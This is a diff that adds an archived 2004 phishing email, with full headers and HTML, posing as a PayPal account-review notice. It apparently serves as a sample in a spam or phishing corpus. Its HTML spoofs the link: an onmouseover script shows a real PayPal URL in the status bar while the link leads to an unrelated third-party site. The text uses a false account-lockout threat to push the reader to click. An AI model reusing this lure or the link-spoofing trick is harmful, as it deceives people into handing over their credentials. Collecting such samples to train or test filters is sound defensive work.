@@ -1,0 +1,52 @@
+From nobody Sun Jan 25 13:47:53 2015
+Return-Path: <service@paypal.com>
+X-Original-To: username@domain.com
+Delivered-To: username@domain.com
+Received: from 66.15.77.18 (bdsl.66.15.77.18.gte.net [66.15.77.18])
+ by spanky.domain.com (Postfix) with SMTP id A2817539CD5
+ for <username@domain.com>; Wed,  1 Dec 2004 08:49:23 -0500 (EST)
+Received: from inbound.newmilltrout.com.criticalpath.net
+ (inbound.newmilltrout.com.criticalpath.net [209.228.4.167]) by
+ wcgtulsmtp02.wcg.com with SMTP; Dec, 01 2004 7:38:12 AM +0100
+From: service@paypal.com <service@paypal.com>
+To: username@domain.com
+Subject: PayPal Notification: Account Review
+Sender: service@paypal.com <service@paypal.com>
+Mime-Version: 1.0
+Content-Type: text/html; charset="iso-8859-1"
+Date: Wed, 1 Dec 2004 08:49:25 -0500
+X-Mailer: Microsoft Outlook IMO Build 9.0.2416 (9.0.2910.0)
+Message-Id: <20041201134923.A2817539CD5@spanky.domain.com>
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 15
+
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body>
+Dear PayPal customer,
+<p>It has come to our attention that when logging into PayPal, <br>
+  you or somebody else have made several login attempts and reached <br>
+  your daily attempt limit. As an additional security measure your <br>
+  access to PayPal will be limited in the next 24 hours if you do not <br>
+  verify your identity.</p>
+<p>
+<a onmouseover="window.status='https://www.paypal.com/cgi-bin/webscr?cmd=_verification'; return 
+true;" href="http://www.cybercore.com.uy/ssl/pp/" target="_blank" >
+https://www.paypal.com/cgi-bin/webscr?cmd=_verification</a>
+<br>
+</p>
+<p>Please verify your details clicking on the link above, before trying to <br>
+  log in again. You will be able to attempt logging into PayPal account <br>
+  immediately after you verify your identity without any limitations <br>
+  applying to your account.</p>
+<p> <br>
+  Sincerely,<br>
+  PayPal Account Review Team<br>
+  PayPal, an eBay Company</p>
+</body>
+</html>
